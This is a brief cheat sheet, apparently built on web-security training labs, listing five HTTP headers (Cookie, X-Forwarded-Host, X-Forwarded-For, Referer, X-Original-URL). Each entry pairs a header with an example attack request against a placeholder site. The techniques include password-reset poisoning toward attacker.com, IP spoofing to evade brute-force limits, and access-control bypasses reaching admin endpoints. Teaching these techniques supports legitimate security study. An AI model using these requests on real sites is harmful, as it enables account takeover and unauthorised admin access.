# Useful HTTP Headers for Exploitation

---

## 1. Cookie

**Description:**
Stores session data, user roles, persistent login tokens, and other sensitive information. Manipulating cookies can lead to session hijacking, privilege escalation, or bypassing authentication.

**Example Request:**

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=abc123; stay-logged-in=carlos:md5hash
```

**Scenario:**

- Change `admin=false` to `admin=true` in a cookie to gain admin access.
- Brute-force or steal `stay-logged-in` cookies to hijack accounts.

---

## 2. X-Forwarded-Host

**Description:**
Indicates the original host requested by the client. Some middleware trusts this header to generate password reset links, making it vulnerable to poisoning.

**Example Request:**

```http
POST /forgot-password HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-Host: attacker.com
```

**Scenario:**

- Poison password reset emails by setting `X-Forwarded-Host` to a domain you control, allowing you to intercept reset tokens.

---

## 3. X-Forwarded-For

**Description:**
Used to identify the originating IP address of a client connecting through a proxy. Can be manipulated to bypass IP-based rate limiting or brute-force protections.

**Example Request:**

```http
POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.2.3.4
```

**Scenario:**

- Spoof your IP address to avoid being blocked during brute-force attacks.

---

## 4. Referer

**Description:**
Indicates the URL of the page making the request. Some applications use it for access control, which is insecure as it can be easily manipulated.

**Example Request:**

```http
POST /admin-roles HTTP/1.1
Host: vulnerable-website.com
Referer: https://vulnerable-website.com/admin
Cookie: session=abc123
```

**Scenario:**

- Set the `Referer` header to the admin page URL to perform admin actions as a regular user.

---

## 5. X-Original-URL / X-Rewrite-URL

**Description:**
Non-standard headers used by some backend frameworks to override the request URL. Can be exploited to access restricted endpoints.

**Example Request:**

```http
GET / HTTP/1.1
Host: vulnerable-website.com
X-Original-URL: /admin/deleteUser
```

**Scenario:**

- Add `X-Original-URL` to access admin-only endpoints without proper authorization.

---
